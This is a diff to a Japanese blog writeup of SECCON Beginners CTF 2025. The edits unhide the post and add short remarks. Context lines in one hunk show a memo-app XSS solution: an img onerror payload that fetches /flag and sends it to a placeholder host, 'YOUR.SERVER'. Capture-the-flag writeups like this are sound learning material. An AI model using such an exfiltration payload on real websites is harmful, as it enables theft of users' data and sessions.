@@ -3,7 +3,6 @@ title: "SECCON Beginners CTF 2025 writeup"
 tags:
   - "CTF"
   - "writeup"
-hidden: true
 ---
 
 7/26から開催されたSECCON Beginners CTF 2025にTPCとして参加し、880チーム中1位だった。  
@@ -539,7 +538,8 @@ app.listen(50000, '0.0.0.0', ()=>console.log('Server running on http://localhost
 
 プログラムを見てみる。メモを投稿する際に`sanitizeHtml`を行ったあとに`processEmojis`をしている。後者の処理は`:`に挟まれた箇所が`emojiMap`にあればそれを、URLならimgタグにして返すものであり、`fragment`が何も処理されずURLにそのまま結合されている。なのでここからXSSができそうだ。
 
-よって次の内容をメモに投稿し、そのidを通報するとフラグが獲得できる。
+URLなどにコロンが含まれないよう注意しながらペイロードを作成する。  
+次の内容をメモに投稿し、そのidを通報するとフラグが獲得できる。
 
 ```txt showLineNumbers=false
 :http://example.com/blank.png#" onerror="fetch('/flag').then(r=>r.text()).then(f=>location.href='//YOUR.SERVER/f?f='+f):
@@ -1375,7 +1375,7 @@ print(p.recvall().decode())
 
 ## まとめ
 
-参加者数がとても多く、面白い問題も多く非常に面白かった。  
+参加者数がとても多く、面白い問題も多く非常に面白かった。来年はjail系があるといいなぁ...  
 3カテゴリを全完で来て良かったが、cryptoやpwnのボス問は現状解ける気がしないのでまだまだだと感じる。
 (チームメンバーがすごかった)  
 今回始めてrevをまともにやり、結構楽しかったので今後もちょくちょく触っていきたい。
